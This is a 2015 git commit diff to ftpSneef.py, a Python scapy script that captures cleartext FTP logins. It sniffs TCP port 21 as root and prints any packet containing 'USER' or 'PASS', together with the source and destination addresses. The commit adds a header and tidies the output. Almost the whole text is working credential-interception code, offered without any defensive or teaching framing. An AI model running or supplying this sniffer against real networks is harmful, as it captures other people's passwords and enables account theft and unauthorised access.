b7a230330bf7e0a0e24279be48e02cf80a757e02
daguy666 <jpistonejr@gmail.com>
2015-11-28 17:27:53 -0500

    Cleaned this up a bit. Also fixed the output to show source and destination.

--- networkScripts/ftpSneef.py
+++ networkScripts/ftpSneef.py
@@ -1,4 +1,21 @@
 #!/usr/bin/env python
+# -----------------------------------------------------------
+# Filename      : ftpSneef.py
+# Description   :
+# Created By    : Joe Pistone
+# Date Created  : 28-Nov-2015 18:57
+# Date Modified :
+#
+# License       : Development
+#
+# Description   : Sniff packets for credentials on port 21
+#
+# (c) Copyright 2015, TheKillingTime all rights reserved.
+#-----------------------------------------------------------
+
+__author__  = "Joe Pistone"
+__version__ = "0.1"
+
 
 import os
 from scapy.all import *
@@ -10,14 +27,16 @@ def packetCallBack(packet):
     '''
     effteepea_packet = str(packet[TCP].payload)
     if "USER" in effteepea_packet or "PASS" in effteepea_packet:
-        print "[=>] Server: %s" % packet[IP].dst
+        print "--" * 25
+        print "\n[=>] Server: %s" % packet[IP].dst
+        print "[=>] Source: %s" % packet[IP].src
         print "[=>] %s" % packet[TCP].payload
-
+        print "--" * 25
 
 if __name__ == '__main__':
     try:
         if os.getuid() == 0:
-            print "[>] Sniffing traffic on port 21 for credentials....\n"
+            print "[*] Sniffing traffic on port 21 for credentials....\n"
             sniff(filter='tcp port 21', prn=packetCallBack, store=0)
         else:
             print "[!] Please run this script as root."
